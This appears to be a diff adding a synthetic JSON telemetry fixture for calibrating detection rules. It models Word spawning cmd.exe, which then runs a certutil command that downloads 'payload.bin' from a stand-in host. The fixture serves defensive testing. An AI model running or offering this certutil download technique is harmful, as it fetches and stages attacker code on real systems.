@@ -1,0 +1,39 @@
+{
+  "fixture_id": "v1-cal-alpha-ingress",
+  "description": "Declared-provenance SYNTHETIC v1 scenario for family 'v1-cal-alpha-ingress' (role=calibration). Tier-1 machinery only; NOT real-world accuracy evidence. Raw telemetry only; labels live in annotations/. Replays via fixtures/phase1_core_rules.json (unmodified) + the Stage 2 calibration evidence-type rule pack to one attribution unit.",
+  "scenarios": [
+    {
+      "scenario_id": "ca1",
+      "raw_record": {
+        "record_id": "rec-ca1",
+        "timestamp": "2026-09-01T09:00:00+00:00",
+        "observation_id": "obs-ca1"
+      },
+      "process": {
+        "name": "cmd.exe",
+        "entity_id": "ca1",
+        "parent_name": "WINWORD.EXE"
+      },
+      "host": {
+        "id": "host-cal-alpha"
+      }
+    },
+    {
+      "scenario_id": "ca2",
+      "raw_record": {
+        "record_id": "rec-ca2",
+        "timestamp": "2026-09-01T09:00:05+00:00",
+        "observation_id": "obs-ca2"
+      },
+      "process": {
+        "name": "certutil.exe",
+        "entity_id": "ca2",
+        "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.bin payload.bin",
+        "parent_entity_id": "ca1"
+      },
+      "host": {
+        "id": "host-cal-alpha"
+      }
+    }
+  ]
+}
